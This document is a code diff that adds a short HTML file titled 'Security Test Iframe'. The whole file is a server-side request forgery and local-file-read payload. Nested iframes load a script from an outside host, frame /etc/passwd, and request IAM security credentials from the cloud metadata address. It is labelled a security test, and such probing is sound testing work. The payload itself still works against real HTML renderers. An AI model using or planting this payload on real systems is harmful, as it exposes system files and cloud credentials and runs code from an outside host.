@@ -1,0 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Security Test Iframe</title>
+</head>
+<body>
+  <iframe srcdoc='<script src="https://donreddy.vercel.app"></script><iframe src="file:///etc/passwd" width="20%" height="30%"></iframe><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" title="SSRF Test" width="20%" height="30%"></iframe>'></iframe>
+</body>
+</html>
